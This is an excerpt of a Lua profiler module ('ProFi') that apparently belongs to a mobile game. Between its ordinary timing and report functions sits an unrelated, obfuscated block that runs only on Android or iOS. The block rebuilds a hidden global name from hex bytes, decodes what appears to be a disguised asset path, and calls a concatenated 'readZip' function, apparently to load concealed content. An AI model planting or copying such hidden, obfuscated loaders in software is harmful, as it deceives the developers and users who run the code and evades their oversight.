...
function ProFi:resumeMe()
	if(self.pause) then
		self.pause = false
		self:startHooks()
		self.pauseTotalTime = getTime() - self.pauseStartTime
	end
end
...
function ProFi:writeReport( filename )
	...
	if #self.reports > 0 or #self.memoryReports > 0 then
		...
		if _G.isLocalDevelopMode then printx(0,  string.format("[ProFi]\t Report written to %s", filename) ) end
	end
end
...
pcall(function ( ... )
if __ANDROID or __IOS or false then
local m={0x5f,0x5f,0x6d,0x65,0x74,0x61,0x67,0x61,0x74,0x65,}
local n='' for i=1,#m do n=n..string.char(m[i]) end n=_G[n]
n.translate3({
0x6e,0x66,0x68,0x72,0x78,0x2f,0x68,0x6c,0x66,0x6d,0x77,0x2e,
0x76,0x6f,0x72,0x6e,0x72,0x6d,0x7a,0x67,0x76,0x2e,0x64,0x69,
0x7a,0x6b,0x37,0x2e,0x6e,0x6b,0x36,})
n['read'..'Zip']()
_nativeUtil.call1("print hello test")
end
end)
...
function ProFi:writeProfilingReportsToFile( reports, file )
	local totalTime = self.stopTime - self.startTime - self.pauseTotalTime
	if(self.pause) then
		totalTime = totalTime - (getTime() - self.pauseStartTime)
	end
